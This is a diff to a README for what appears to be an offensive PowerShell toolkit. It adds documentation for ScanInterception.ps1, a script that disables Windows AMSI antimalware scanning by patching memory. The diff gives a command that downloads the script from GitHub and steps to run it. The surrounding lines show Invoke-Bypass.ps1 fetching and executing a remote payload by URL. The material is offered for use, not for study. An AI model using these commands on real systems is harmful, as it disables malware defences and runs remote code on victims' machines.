@@ -75,3 +75,32 @@ Get-Help .\Invoke-Bypass.ps1 -full
 .\Invoke-Bypass.ps1 -technic "3" -filepath "payload.ps1" -fileargs "-action 'true'"
 .\Invoke-Bypass.ps1 -technic "2" -payloadUrl "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1" -fileargs "-sysinfo enum"
 ```   
+
+<br />
+
+## ScanInterception.ps1
+   
+|Cmdlet Name|Description|Privileges|Notes|
+|---|---|---|---|
+|[ScanInterception](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Ams1-Bypass/ScanInterception.ps1)|Unchain AMSI by patching the provider’s unmonitored memory space|User Land|Available for x64 bytes only|
+
+<br />
+
+**downloadcmdLet:**
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/ScanInterception.ps1" -OutFile "ScanInterception.ps1"
+```
+
+<br />
+
+**execute:**
+```powershell
+#Test detection
+amsiutils
+
+#Patch amsi scan function
+.\ScanInterception.ps1
+
+#Test detection
+amsiutils
+```   
